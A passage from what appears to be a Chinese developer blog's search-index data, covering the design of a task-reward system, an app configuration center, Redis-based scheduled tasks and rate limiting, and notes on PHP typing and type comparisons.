需要红点提醒用户当前有奖励可领取，用户领取后并且当前没有待领取奖励小红点消失，任务完成进度和领取状态仅保持当天，隔天刷新。 业务分析 在开发前需要对需求进行整理，对细节进行确认，然后设计解决方案，预估开发时间，这里将对于业务中核心的内容进行梳理： 用户想要完成任务，需要去操作其他业务功能，如：评论成功后需要完成每日评论任务，关注主题后完成关注新手任务，这里就涉及核心问题，任务需要依赖于其他业务 为了保障后续拓展性，任务需要支持后台管理，配置任务名，描述，任务类型（每日，新手，活动），完成次数，奖励积分数量，去完成跳转 uri 等 用户完成任务后不用自动领取奖励，需要进入到任务列表点击领取操作，可领取时导航 Tab 需要小红点提醒，和产品确认任务的完成和提醒的用户体验 可以接受短时间延迟 用户多次操作业务，或者出现重复操作（恶意并发请求刷积分），保证任务只能完成一次并且只能领取一次奖励，需要保证幂等性 方案设计 核心目标： 任务依赖其他业务，需要进行解耦，不影响其他业务的功能和性能 设计后台可管理，便于后续拓展 抽象任务模块，代码抽象开发 完成任务和领取需要保证幂等性 高可用 名词定义： 事件 任务中涉及依赖其他业务，这里需要抽象出一个概念，用户通过操作业务，完成任务的这个操作，我们把这个过程定义为用户完成任务事件触发完成，如：评论事件，点赞事件，关注事件，等 解决方案： 在实现方案上，采用异步消耗队列的方式，依赖业务接口埋入事件上报，将用户成功操作业务的任务事件上报到队里中，然后开发消息消耗的脚本程序，对消息中用户触发的任务事件进行业务逻辑处理和 DB 操作，更新用户任务进度和可领取状态，响应给用户(完成任务红点提醒)，设计图： 依赖业务解耦 依赖业务将操作成功用户的任务事件上报到消息队列，然后程序进行异步消耗 方案解决了依赖业务之间的强耦合，并且基本不影响现有依赖业务的接口性能 高可用： 通过调度系统启动多进程对队列进行消耗 进程守护系统，守护进程保活，奔溃重启，可对执行日志进行记录与查看 如： gocron 消息队列监控，无法及时消耗进行预警，保障即时性，避免长时间的延迟 rabbitmq redis list … … 容错与补偿 队列消耗失败需要进行记录，并可根据业务场景，通过另外程序进行补充处理 用户操作业务上报任务事件不限制次数，以免用户没完成任务，允许用户重新尝试去做任务，程序消耗需要控制任务只能完成一次 表结构： -- 任务表 CREATETABLE`task`(`id`int(11)NOTNULLAUTO_INCREMENTCOMMENT'自增',`icon`varchar(300)NOTNULLDEFAULT''COMMENT'图标',`title`varchar(30)NOTNULLDEFAULT''COMMENT'任务标题',`type`tinyint(4)NOTNULLDEFAULT'0'COMMENT'任务类型，新手任务=1,每日任务=2',`event`int(11)NOTNULLDEFAULT'0'COMMENT'事件',`des`varchar(30)NOTNULLDEFAULT''COMMENT'任务描述',`target_num`int(11)NOTNULLDEFAULT'0'COMMENT'目标数量',`points`int(11)NOTNULLDEFAULT'0'COMMENT'金币',`sort`int(11)NOTNULLDEFAULT'0'COMMENT'排序',`status`tinyint(4)NOTNULLDEFAULT'0'COMMENT'状态 0=下线，1=上线，-1=删除',`app_version`varchar(15)NOTNULLDEFAULT''COMMENT'app版本号',`app_version_compare`varchar(10)NOTNULLDEFAULT''COMMENT'app版本号比较运算符',`operator`varchar(10)NOTNULLDEFAULT''COMMENT'操作人',`jump_uri`varchar(300)NOTNULLDEFAULT''COMMENT'跳转协议',`create_at`timestampNOTNULLDEFAULTCURRENT_TIMESTAMPCOMMENT'创建时间',`update_at`timestampNOTNULLDEFAULTCURRENT_TIMESTAMPCOMMENT'更新时间',`event_begin`timestampNOTNULLDEFAULT'1970-01-02 00:00:00'COMMENT'事件开始时间',`event_end`timestampNOTNULLDEFAULT'1970-01-02 00:00:00'COMMENT'事件结束时间',`task_begin`timestampNOTNULLDEFAULT'1970-01-02 00:00:00'COMMENT'任务开始时间',`task_end`timestampNOTNULLDEFAULT'1970-01-02 00:00:00'COMMENT'任务结束时间',PRIMARYKEY(`id`))ENGINE=InnoDBDEFAULTCHARSET=utf8mb4;-- 用户任务情况表 CREATETABLE`user_task_case`(`id`int(11)NOTNULLAUTO_INCREMENTCOMMENT'用户任务情况',`user_id`bigint(20)NOTNULLDEFAULT'0'COMMENT'用户ID',`task_id`int(11)NOTNULLDEFAULT'0'COMMENT'任务id',`task_type`int(11)NOTNULLDEFAULT'0'COMMENT'任务类型',`event`int(11)NOTNULLDEFAULT'0'COMMENT'事件',`task_uni`varchar(30)NOTNULLDEFAULT''COMMENT'任务唯一标识(唯一约束) ',`target_num`int(11)NOTNULLDEFAULT'0'COMMENT'目标数量',`finish_num`int(11)NOTNULLDEFAULT'0'COMMENT'完成数量',`points`int(11)NOTNULLDEFAULT'0'COMMENT'可领取金币数量',`status`tinyint(4)NOTNULLDEFAULT'0'COMMENT'状态 0=待完成，1=待领取，2=已经领取',`finish_at`timestampNOTNULLDEFAULT'1970-01-02 00:00:00'COMMENT'完成任务时间',`get_at`timestampNOTNULLDEFAULT'1970-01-02 00:00:00'COMMENT'领取时间',`create_at`timestampNOTNULLDEFAULTCURRENT_TIMESTAMPCOMMENT'创建时间',PRIMARYKEY(`id`),UNIQUEKEY`uni_user_id_task_uni`(`user_id`,`task_uni`)USINGBTREE,)ENGINE=InnoDBDEFAULTCHARSET=utf8mb4COMMENT='用户任务情况表';更新语句： -- 更新领取状态，注意：WHERE条件，强校验 UPDATEuser_task_caseSET`status`=2,finish_at=CURRENT_TIMESTAMPWHEREid=:idANDuser_id=:user_idAND`status`=1ANDfinish_num\u003e=target_num表重点字段说明： task_uni 任务唯一标识 user_id 和 task_uni 组合唯一约束索引 每日任务： 任务 id任务类型日期（task_id_type_date） 默认都是只做一次(新手任务/活动任务)： 任务 id（task_id） 幂等性 user_task_case 表中 user_id 和 task_uni 组合唯一约束索引，通过 mysql 的唯一约束，保证了多进程并行消耗事件队列的情况下，每日任务和一次性任务不能重复 INSERT 通过 UPDATE 的 WHERE 条件校验保障领取的幂等性 管理后台： 产品在规划需求的时候会设计出相关后台，但是不一定设计的合理，所以这里需要根据确认的解决方案协助产品对于管理后台进行调整，保障后续的拓展性 代码层面： 面向抽象开发，合理使用设计模式，便于后续的拓展 话外篇： 谈近一年的感悟，近一年参与了新 APP 项目的开发，从 0 开始搭建项目，看着 DAU 一点点儿的涨起来，还是挺有成就感的。 角色上产生了变化，现在感觉自己更像是一个项目的参与者，而不是任务的执行人，完成业务开发的同时也会对产品上有根深了解。 空闲时间也会对竞品调研以及用户使用意见或者问题进行跟进","date":"2020-04-06","objectID":"/posts/2020-04-06-product-do-task/:0:0","tags":["做任务"],"title":"大话业务场景与解决方案：做任务","uri":"/posts/2020-04-06-product-do-task/"},{"categories":["业务设计"],"content":"在参与各种 app 业务开发的过程中，大部分都会遇到需要对某些功能/界面/数据可以灵活的管理后台控制，客户端根据配置变化而变化，不需要发版本就可以解决这些需求，大致功能需求就是需要提供一个后台功能，能够给产品/运营童鞋进行配置管理，然后通过服务端接口输出给客户端进行逻辑/渲染使用，这里针对这种场景，分享一个相对通用的解决方案 项目背景 当前项目中针对这种配置的需求，每次都需要开发人员重新开发后台表单，然后修改配置接口针对配置进行输出，因为这个功能的开发要归宿到很早以前，也不知道当初为啥要这么做，现在存在的问题就是不容易维护和拓展，以及重复开发的成本 整理需求 配置管理后台 支持版本控制 支持客户端类型（安卓/IOS/所有） 表单可配置 配置输出接口 增量下发 保证高可用，高稳定，高性能 客户端 接口下发配置数据进行缓存 技术背景 管理后台：php 服务端+jquery+bootstrap 接口项目：php 服务端 技术过程 前端技术选型： vuejs element ui 核心问题，如何后台配置生成表单（开发人员来配置）？ 初步计划是通过配置表单的 JSON 生成 element ui 的表单，进行了一些调研，也找到可以通过配置 JSON 生成 element ui 表单的 js 库，感觉灵活性差了些，而且当时还不支持富文本，感觉后续拓展也是大问题，所以弃用，后面尝试自己来实现，通过 vuejs+element ui 组件相对简单的方式实现了这个配置表单的功能，能够支持基本需求，具体看后面代码（简单粗暴） 接口数据增量下发，以及客户端获取配置时机和缓存策略 客户端每次启动的时候去获取一次配置，缓存【配置数据】，新增配置添加到缓存，已经存在进行替换 接口输出【配置数据】的同时在响应头上【timestamp】= 带上当前请求的服务器时间戳 客户端获取数据，缓存【配置数据】\u0026【timestamp】 客户端下次请求的头上带上【timestamp】= 缓存的时间戳，第一次请求可以不用 服务端接收到请求的时候获取客户端的【timestamp】，过滤配置的时候校验最后更新时间\u003e=【timestamp】进行输出【配置数据】 保障高可用，高稳定，高性能，容错 配置数据进行多级缓存，第一级缓存【redis】，第二级缓存【服务器内存】（php apcu） 接口优先从【服务器内存】中获取，如果不存在从【redis】 并同步到【服务器内存】，不存在从【mysql】 并同步到【redis】，正常后台编辑完就同步到 redis，【服务器内存】就进行短暂性的缓存（3s），保障在高并发的情况下可以快速下发，弊端就是数据变化的时候会延迟 N/s 后更新 客户端在获取缓存配置的时候如果不存在需要自己有个默认配置，极端情况下无法获取配置的容错机制，保障功能的正常运行 解决方案 配置管理列表界面： 配置添加和表单 JSON 配置界面（开发人员操作）： 配置数据表单界面（产品/运营童鞋操作）： 前端框架/库： vuejs element ui 饿了么 UI jsoneditor json 编辑组件 VueQuillEditor vuejs 富文本组件 主要的代码内容，如下： 表设计： -- 配置中心表 CREATETABLE`config_center`(`id`int(11)NOTNULLAUTO_INCREMENTCOMMENT'自增ID',`title`varchar(100)NOTNULLDEFAULT''COMMENT'标题',`code`varchar(60)NOTNULLDEFAULT''COMMENT'标识',`platform`tinyint(4)NOTNULLDEFAULT'0'COMMENT'0=所有，1=IOS，2=安卓',`template`tinyint(4)NOTNULLDEFAULT'1'COMMENT'模板标识',`form_json`textNOTNULLCOMMENT'表单JSON',`form_data`textNOTNULLCOMMENT'表单数据',`description`varchar(255)NOTNULLDEFAULT''COMMENT'描述',`app_version`varchar(15)NOTNULLDEFAULT''COMMENT'app版本',`app_version_compare`varchar(10)NOTNULLDEFAULT''COMMENT'app版本比较符号',`operator`varchar(20)NOTNULLDEFAULT''COMMENT'编辑人',`create_at`timestampNOTNULLDEFAULTCURRENT_TIMESTAMPCOMMENT'创建时间',`update_at`timestampNOTNULLDEFAULTCURRENT_TIMESTAMPCOMMENT'更新时间',`status`tinyint(4)NOTNULLDEFAULT'1'COMMENT'状态，1=有效，-1=删除',PRIMARYKEY(`id`),KEY`index_code`(`code`),KEY`index_update_at_platform`(`update_at`,`platform`))ENGINE=InnoDBDEFAULTCHARSET=utf8mb4;表单配置 JOSN 内容： [ { el: \"input\", type: \"textarea\", name: \"名字\", field: \"name\", value: \"6666\", rule: [ { required: true, message: \"请输入活动名称\", trigger: \"blur\", }, ], }, { el: \"input-number\", type: \"\", name: \"数字\", field: \"number\", value: 1, min: 1, max: 1000, rule: [ { required: true, message: \"数字\", trigger: \"blur\", }, ], }, { el: \"input\", type: \"text\", name: \"描述\", field: \"desc\", value: \"\", rule: [ { required: true, message: \"请输入活动名称\", trigger: \"blur\", }, ], }, { el: \"editor\", type: \"\", name: \"富文本\", field: \"editor\", value: \"\", rule: [ { required: true, message: \"请输入内容\", trigger: \"blur\", }, ], }, { el: \"date\", type: \"datetimerange\", name: \"日期范围\", field: \"datetime\", value: [\"2019-01-01 10:00:00\", \"2019-03-01 08:00:00\"], rule: [ { required: true, message: \"必须\", trigger: \"blur\", }, ], }, { el: \"switch\", type: \"\", name: \"开关\", field: \"open\", value: false, rule: [ { required: true, message: \"必须\", trigger: \"blur\", }, ], }, { el: \"date\", type: \"datetime\", name: \"活动时间\", field: \"datet\", value: \"2019-01-01\", }, { el: \"slider\", type: \"\", name: \"范围\", field: \"fw\", value: 0, max: 500, }, { el: \"color\", type: \"\", name: \"颜色\", field: \"color\", value: \"\", }, { el: \"radio\", type: \"\", name: \"类型\", field: \"type\", value: 0, options: [ { label: \"类型1\", value: 1, }, { label: \"类型2\", value: 2, }, { label: \"类型3\", value: 3, }, ], }, { el: \"select\", type: \"\", name: \"食品\", field: \"foods\", value: \"黄金糕\", options: [ { value: 1, label: \"黄金糕\", }, { value: 2, label: \"双皮奶\", }, { value: 3, label: \"蚵仔煎\", }, { value: 4, label: \"龙须面\", }, { value: 5, label: \"北京烤鸭\", }, ], }, { el: \"checkbox\", type: \"\", name: \"城市\", field: \"city\", value: [0], options: [ { value: 1, label: \"上海\", }, { value: 2, label: \"深圳\", }, { value: 3, label: \"北京\", }, ], }, ]; vuejs + element ui 表单模板主要代码（简单粗暴）","date":"2019-10-08","objectID":"/posts/2019-10-08-config-model/:0:0","tags":["APP配置功能"],"title":"大话APP配置功能的设计和落地","uri":"/posts/2019-10-08-config-model/"},{"categories":["redis"],"content":"需求 异步执行任务 支持定时执行 支持取消任务 保障快速执行 技术背景 基于 redis 实现 php 实现 基于 redis 的 sorted set + hash，实现定时执行任务的 Demo sorted set 介绍： redis 有序集合，且不允许重复的成员，不同的是每个元素都会关联一个 double 类型的分数 redis 正是通过分数来为集合中的成员进行从小到大的排序，有序集合的成员是唯一的,但分数(score)却可以重复 思路： 使用 sortset 类型，将 member[成员] =【任务标识】，score[分数] =【定时时间戳】 使用 hash 类型，将【任务标识】对应的任务数据 JSON 存到 hash 中 key =【任务标识】，value =【任务数据 JSON】 解决及时消耗，可以运行多个进程进行并行执行 php 实现代码 DEMO \u003c?php class DoTest { private const YIELD_KEY = 'yield:list'; private const YIELD_DATA_KEY = 'yield:data'; public function run() { $bbj = RedisClient::instance()-\u003ebbj(); //获取排序（低到高）中第一个task_id $data = $bbj-\u003ezRange(self::YIELD_KEY, 0, 0, true); if (empty($data)) { echo \"无数据\" . PHP_EOL; return null; } $mem = array_keys($data)[0]; $ts = array_values($data)[0]; $now = time(); //校验是否到时 if ($ts \u003e $now) { echo \"还未到时间，无需操作\" . PHP_EOL;; return null; } //移除集合，多进程并执行到时任务(只能被成功移除一次) $row = $bbj-\u003ezRem(self::YIELD_KEY, $mem); if (empty($row)) { echo \"已经被剔除\" . PHP_EOL;; return false; } //获取当前要执行的任务数据JSON $dataJson = $bbj-\u003ehGet(self::YIELD_DATA_KEY, $mem); //todo 执行定时任务业务逻辑 var_export($data); var_export($dataJson); //使用完后删除任务数据JSON $bbj-\u003ehdel(self::YIELD_DATA_KEY, $mem); return true; } public function add(int $time, $i, string $content) { $data = [ 'msg' =\u003e $content . $time ]; $bbj = RedisClient::instance()-\u003ebbj(); $dataJson = json_encode($data); $taskId = $time . '_' . $i; $isSc = $bbj-\u003ezAdd(self::YIELD_KEY, $time, $taskId); if ($isSc) $isSc = $bbj-\u003ehSet(self::YIELD_DATA_KEY, $taskId, $dataJson); var_export($isSc); } public function addFeature($i) { $time = Carbon::now()-\u003eaddMinute()-\u003etimestamp; $this-\u003eadd($time, $i, '未来执行内容'); } public function addCurrent($i) { $time = time(); $this-\u003eadd($time, $i, '马上执行内容'); } /** * 取消定时任务，根据任务ID * @param $taskId */ public function removeYield($taskId) { $bbj = RedisClient::instance()-\u003ebbj(); $bbj-\u003ezRem(self::YIELD_KEY, $taskId); $bbj-\u003ehDel(self::YIELD_DATA_KEY, $taskId); } } 监控定时任务队列 \u003c?php $dt = new DoTest(); while (true) { $rt = $dt-\u003erun(); if (is_null($rt)) { sleep(1); } } 添加当前执行和未来执行任务 \u003c?php $dt = new DoTest(); while (true) { for ($i = 0; $i \u003c 100000; $i++) { // 添加立即执行当前任务 $dt-\u003eaddCurrent($i); // 添加待执行未来任务 $dt-\u003eaddFeature($i); } } 取消定时任务 \u003c?php $dt = new DoTest(); $dt-\u003eremoveYield('taskId'); 解决场景 定时短信发送/email 发送 定时执行??任务 ","date":"2019-08-08","objectID":"/posts/2019-08-08-yield-task/:0:0","tags":["redis"],"title":"Redis实战之实现定时执行任务","uri":"/posts/2019-08-08-yield-task/"},{"categories":["redis"],"content":"最近沉迷于业务开发无法自拔 🤣，有一段时间没有更新博文了，后续博文内容计划把一些业务场景下的实战方案，或者比较好的设计思路进行分享，就不像之前围绕着一个主题，消耗很多的时间去整理相关内容(憋大招)，后续可能一篇的内容量就没那么丰富，但是尽可能针对一个点进行更细化，或者更深入的分析，通过不断分享和自我复盘，进行经验的沉淀，同时提高博文分享的频率 🤙 ","date":"2019-06-04","objectID":"/posts/2019-06-04-redis-limit/:0:0","tags":["redis"],"title":"Redis实战之限制操作频率","uri":"/posts/2019-06-04-redis-limit/"},{"categories":["redis"],"content":"场景 场景 1 留言功能限制，30秒 内只能评论 10次，超出次数不让能再评论，并提示：过于频繁 场景 2 点赞功能限制，10秒 内只能点赞 10次，超出次数后不能再点赞，并禁止操作 1个小时，提示：过于频繁，被禁止操作1小时 场景 3 上传记录功能，限制一天只能上传 100次，超出次数不让能再上传，并提示：超出今日上线 ","date":"2019-06-04","objectID":"/posts/2019-06-04-redis-limit/:0:1","tags":["redis"],"title":"Redis实战之限制操作频率","uri":"/posts/2019-06-04-redis-limit/"},{"categories":["redis"],"content":"抽离本质 在业务开发的过程中，我们不断的参与各种业务场景的方案设计，往往很容易碰到很类似的场景，只不过当前所属的业务模块不一样，其实这些需求的本质是解决同一个问题，当遇到这种场景的时候，我们需要根据自己经验分析抽离出需求的本质问题，实现一个通用的解决方案，让自己的解决方案更有价值，这可能就是区别于你是有灵魂的工程师还是 cp（copy paste）最强王者吧。 分析上面 3 个业务场景，可以从中发现其中有相似的逻辑，称它为同类的问题，现在我们就是要抽离这个问题，设计一个通用的解决方案，勾画相同逻辑流程图： 通过分析上面的需求场景，抽离出他们都需要的那些条件： 限制对象：用户 限制操作（评论，点赞，记录， …） 时间范围 X 秒内 限制操作数 Y 次 超出后禁止操作时间 Z（秒/具体时间） 超出后不让再操作，并提示 （最小时间单位用秒：天/小时/分钟都可换算成秒，用秒可以解决更多的场景） 如果把功能抽离成一个通用函数是不是大概是这样： \u003c?php /** * 频率限制 * @param string $action 操作动作 * @param int $userId 发起操作的用户ID * @param int $time 时间范围X秒内 * @param int $number 限制操作数Y次 * @param array $expire 超出封印时间Z ['type'=\u003e1,'ttl'=\u003e过期时间/秒] ['type'=\u003e2,'ttl'=\u003e具体过期时间戳] 二选一 * @return bool * @throws \\Exception */ public static function frequencyLimit(string $action, int $userId, int $time, int $number, $expire = []) { // todo 根据用户操作动作时间范围，进行频率的控制和失效释放 } ","date":"2019-06-04","objectID":"/posts/2019-06-04-redis-limit/:0:2","tags":["redis"],"title":"Redis实战之限制操作频率","uri":"/posts/2019-06-04-redis-limit/"},{"categories":["redis"],"content":"解决方案落地 功能中需要对用户发起的操作和时间，以及累计次数进行存储，并且需要失效过期的清理，如果这个时候我们依赖 mysql 做存储，想想都觉的挺痛苦，这里主角：redis 终于登场了，基于 redis 特性，incr 的原子操作和 key 支持过期机制，内存存储的效率优势，可以相对简单灵活并且又高效的完成目的。 这里简单实现个通用功能的代码： \u003c?php /** * 频率限制 * @param string $action 操作动作 * @param int $userId 发起操作的用户ID * @param int $time 时间范围X秒内 * @param int $number 限制操作数Y次 * @param array $expire 超出封印时间Z ['type'=\u003e1,'ttl'=\u003e过期时间/秒] ['type'=\u003e2,'ttl'=\u003e具体过期时间戳] 二选一 * @return bool * @throws \\Exception */ public function frequencyLimit(string $action, int $userId, int $time, int $number, $expire = []) { if (empty($action) || $userId \u003c= 0 || $time \u003c= 0 || $number \u003c= 0) { throw new \\Exception('非法参数'); } $key = 'act:limit:' . $action . ':' . $userId; $r = RedisClient::connect(); //获取当前累计次数 $current = intval($r-\u003eget($key)); if ($current \u003e= $number) return false; //累计并返回最新值 $current = $r-\u003eincr($key); //第一次累加，设置控制操作频率的有效时间 if ($current === 1) $r-\u003eexpire($key, $time); //未超出限制次数先放过 if ($current \u003c= $number) return true; //超出后根据需要重新设置过期失效时间 $current === $number 判断保证只重新设置一次 $type = empty($expire['type']) ? 0 : intval($expire['type']); $ttl = empty($expire['ttl']) ? 0 : intval($expire['ttl']); if ($current === $number \u0026\u0026 $ttl \u003e 0 \u0026\u0026 in_array($type, [1, 2])) { if ($type === 1) $r-\u003eexpire($key, $ttl); if ($type === 2) $r-\u003eexpireAt($key, $ttl); } return false; } //场景1 /** * 评论限制 * @param int $userId * @return bool|string */ public function doComment(int $userId) { try { $pass = FrequencyLimit::doHandle('comment', $userId, 30, 10); if (!$pass) return '过于频繁'; // todo 评论逻辑 return true; } catch (\\Exception $e) { return $e-\u003egetMessage(); } } //场景2 /** * 点赞限制 * @param int $userId * @return bool|string */ public function doLike(int $userId) { try { $pass = FrequencyLimit::doHandle('like', $userId, 10, 10, ['type' =\u003e 1, 'ttl' =\u003e 1 * 60 * 60]); if (!$pass) return '过于频繁，被禁止操作1小时'; // todo 点赞逻辑 return true; } catch (\\Exception $e) { return $e-\u003egetMessage(); } } //场景3 /** * 上传限制 * @param int $userId * @return bool|string */ public function doUpload(int $userId) { try { $expire = strtotime(date('Y-m-d', strtotime(+1 . 'days'))); $pass = FrequencyLimit::doHandle('upload', $userId, 1 * 24 * 60 * 60, 100, ['type' =\u003e 2, 'ttl' =\u003e $expire]); if (!$pass) return '超出今日上线'; // todo 上传逻辑 return true; } catch (\\Exception $e) { return $e-\u003egetMessage(); } } //场景N 编码上可以根据你设计这个通用方案的复杂度进行进一步抽象，如抽象成频率限制的功能类 等 ","date":"2019-06-04","objectID":"/posts/2019-06-04-redis-limit/:0:3","tags":["redis"],"title":"Redis实战之限制操作频率","uri":"/posts/2019-06-04-redis-limit/"},{"categories":["redis"],"content":"总结 对相似的业务场景进行分析，发现本质问题并设计通用的解决方案 让解决方案更有价值，做一个有灵魂的开发者 熟练掌握 redis，充分利用它的特性和优势 ","date":"2019-06-04","objectID":"/posts/2019-06-04-redis-limit/:0:4","tags":["redis"],"title":"Redis实战之限制操作频率","uri":"/posts/2019-06-04-redis-limit/"},{"categories":["PHP"],"content":"前言 近期因公司内部转岗，开始参与 PHP 项目进行后端开发，一直都是强类型写的比较多，弱类型语言也有接触了一些，如：nodejs，python，做一些辅助服务，数据采集的事情，刚好内部有这个机会进行可以学以致用，加上之前对后端的理解和经验，很容易上手，这里记录下开发过程遇到的些问题解决方案和自己对 PHP 的理解，以及项目中的部分架构 当前已经进入 PHP7 的版本，做了很多的调整，尤其在性能上有很大的提升 ","date":"2019-02-17","objectID":"/posts/2019-02-17-dahua-php/:0:1","tags":["PHP"],"title":"大话转岗PHP开发小结","uri":"/posts/2019-02-17-dahua-php/"},{"categories":["PHP"],"content":"面向对象 PHP 框架内置很多强大函数，超级全局变量，魔术函数，魔术变量，可以通过提供的内置函数对 PHP 项目进行拓展，数据类型操作，http 信息获取等，通过安装拓展添加各种功能支持，框架内置函数调用大部分还是偏向面向过程，通过调用函数，传入要操作的类型数据和依赖数据，这里刚开始有些不习惯，面向对象的开发中习惯直接 类型变量/对象 点出函数。 现在 PHP 开发可以选择使用面向过程也可以用面向对象，最早 PHP 版本不支持面向对象特性，PHP5 开始对 OOP 有良好的支持，很多 PHP 开发者没有系统性的学习 OOP 相关知识，包括工龄长的 PHP 开发者或者老的项目很多还是偏向面向过程开发，所以会接触到很多偏向面向过程开发的项目 在项目开发过程中遇到些偏应用业务开发的项目，看似有用到类，但是并没用到面向对象的特性对业务进行抽象，如：项目中每个业务功能有个 php 文件对应一个类，类里里大部分都是逻辑 function，然后通过拓展 autoload，实现自动 include php 文件，比如通过 L 函数传入要调用的类名，构造出 PHP 文件路径，进行 include，然后返回类实例对象，只是通过类文件来区分功能函数，并没有使用到面向对象的特性进行封装，还是偏向面向过程思路在开发 PHP5 开始对 OOP 提供了良好支持，基本已经和 java，C# 面向对象语法相似，可以使用命名空间，封装 interface，abstract，多态：implements，extends，PHP7 还支持多继承 trait，方便封装些公用的功能，通过 PSR4 规范，引入 composer 实现的 autoload，可以很好的进行 OOP 开发 PHP 开发还是比较灵活，可以面向过程也可以面向对象，根据具体的业务场景设计 使用 composer psr4 在项目中添加 composer.json 文件，根据自己需求配置 { \"autoload\": { \"psr-4\": { \"Library\\\\\": \"library/\" } } } 在 composer.json 文件所在目录下输入命令，就会自动 download vendor/composer autoload 相关文件 composer install php 中的入口 index include autoload.php include_once \"vendor/autoload.php\"; 注意，配置修改，内容变更的时候需要执行 composer dump-autoload -o ","date":"2019-02-17","objectID":"/posts/2019-02-17-dahua-php/:0:2","tags":["PHP"],"title":"大话转岗PHP开发小结","uri":"/posts/2019-02-17-dahua-php/"},{"categories":["PHP"],"content":"弱类型问题 编码问题： 在刚学习 PHP 语法的时候比较不习惯的就是弱类型，不用去定义变量类型，参数类型，返回值类型，对于习惯强类型的童鞋开始会有些不习惯，不定义类型心里怪怪的，总感觉哪里会导致些错误，而且弱类型在编码的过程中 IDE 不会有类型错误的一些提示，只有在运行的时候报错了才能知道这里错误了，错误提示滞后。尤其是从 DB 查询数据返回的是一个 stdclass/array，获取到的数据没有对应一个实体类，无法知道具体数据有哪些字段，需要通过查询的 sql 语句，然后通过查看表结构才能知道数据字段信息，这点很难受，影响开发效率 PHP 现在已经支持 typehint，通过定义类型可以对部分确定的类型变量，参数，返回类型进行强类型的定义，尤其需要定义表数据 Model 类，这样得到数据对象后通过-\u003e可以感知出所有数据字段，方便后续拓展开发和维护 根据场景使用，不能说因为自己习惯使用强力型就把所有类型定义都写成强类型 /** * Class MJop * @property int $id 工作ID * @property string $name 工作名字 * @property int $salary 薪水 */ class MJop { } /** * Class MWorker * @property string $name 员工名字 * @property int $age 年龄 * @property MJop $jop 工作 */ class MWorker { } class Worker { /** * 获取员工信息 * @param int $id * @return MWorker|stdClass */ public function get(int $id): stdClass { // mysql select return new stdClass(); } } class Logic { /** * 获取员工描述 * @param int $workId * @return string */ public function Desc(int $workId): string { $worker = new Worker(); $mWorker = $worker-\u003eget($workId); return '名字：' . $mWorker-\u003ename . '，年龄:' . $mWorker-\u003eage . '，工作：' + $mWorker-\u003ejop-\u003ename . '，薪水:' . $mWorker-\u003ejop-\u003esalary; } } 通过定义变量类型得到代码感知 /** @var Logic $logic */ $logic=new Logic(); 弱类型比较一个头两个大： 因为 PHP 是弱类型原因，在做类型比较的时候，往往会因为一个不小心就掉坑里，下面列出类型函数和类型比较的表格 就问你，看到这些表格怕不怕，心中有一万只草泥马奔腾而过，瞬间变成幽怨的小眼神 使用 PHP 函数对变量 $x 进行比较 表达式 gettype() empty() is_null() isset() boolean : if($x) $x = “\"; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = “1”; string FALSE FALSE TRUE TRUE $x = “0”; string TRUE FALSE TRUE FALSE $x = “-1”; string FALSE FALSE TRUE TRUE $x = “php”; string FALSE FALSE TRUE TRUE $x = “true”; string FALSE FALSE TRUE TRUE $x = “false”; string FALSE FALSE TRUE TRUE 松散比较 == 类型 TRUE FALSE 1 0 -1 “1” “0” “-1” NULL array() “php” \"” TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE 1 TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE FALSE TRUE TRUE -1 TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE “1” TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE “0” FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE “-1” TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE TRUE FALSE TRUE array() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE “php” TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE 严格比较 === 类型 TRUE FALSE 1 0 -1 “1” “0” “-1” NULL array() “php” \"\" TRUE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 1 FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE -1 FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE “1” FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE “0” FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE “-1” FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE array() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE “php” FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE 参考官方类型比较文档 刚接触 PHP 